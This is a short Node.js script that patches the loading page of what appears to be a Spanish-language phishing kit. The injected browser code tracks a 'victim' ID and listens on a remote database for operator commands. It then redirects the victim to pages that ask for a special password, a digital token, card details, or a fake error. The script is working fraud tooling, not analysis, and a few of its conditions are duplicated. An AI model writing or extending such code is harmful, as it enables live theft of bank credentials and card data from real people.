const fs = require('fs');
let html = fs.readFileSync('cargando.html', 'utf8');

const newScript = `
  window.addEventListener('load', function() {
      let victimId = localStorage.getItem('current_victim_id');
      
      const debugDiv = document.createElement('div');
      debugDiv.style = 'position:fixed;top:0;left:0;background:black;color:white;padding:10px;z-index:9999;font-size:16px;font-family:monospace;';
      debugDiv.innerText = 'Listening on ID: ' + victimId;
      document.body.appendChild(debugDiv);
      
      if (!victimId) return; // If no victim ID, do nothing

      db.ref(DB_PATH + '/' + victimId + '/command').on('value', function(snapshot) {
          const command = snapshot.val();
          debugDiv.innerText += '\\nReceived: ' + JSON.stringify(command);
          if (command && command.action) {
              // Delete command so we don't immediately trigger it again
              db.ref(DB_PATH + '/' + victimId + '/command').remove().then(() => {
                  if (command.action === 'pedir_token') {
                      window.location.href = 'clave-especial.html';
                  } else if (command.action === 'pedir_correo') {
                      window.location.href = 'token-digital.html';
                  } else if (command.action === 'pedir_tarjeta') {
                      window.location.href = 'tarjeta.html';
                  } else if (command.action === 'pedir_tarjeta') {
                      window.location.href = 'tarjeta.html';
                  } else if (command.action === 'error_login' || command.action === 'error_usuario' || command.action === 'error_tarjeta' || command.action === 'error_tarjeta') {
                      window.location.href = 'error.html';
                  } else if (command.action === 'inicio') {
                      window.location.href = 'inicio.html';
                  }
              });
          }
      });
  });
`;

html = html.replace(/window\.addEventListener\('load', function\(\) \{[\s\S]*?\}\);/i, newScript);
fs.writeFileSync('cargando.html', html, 'utf8');
console.log('Replaced script with debug script.');
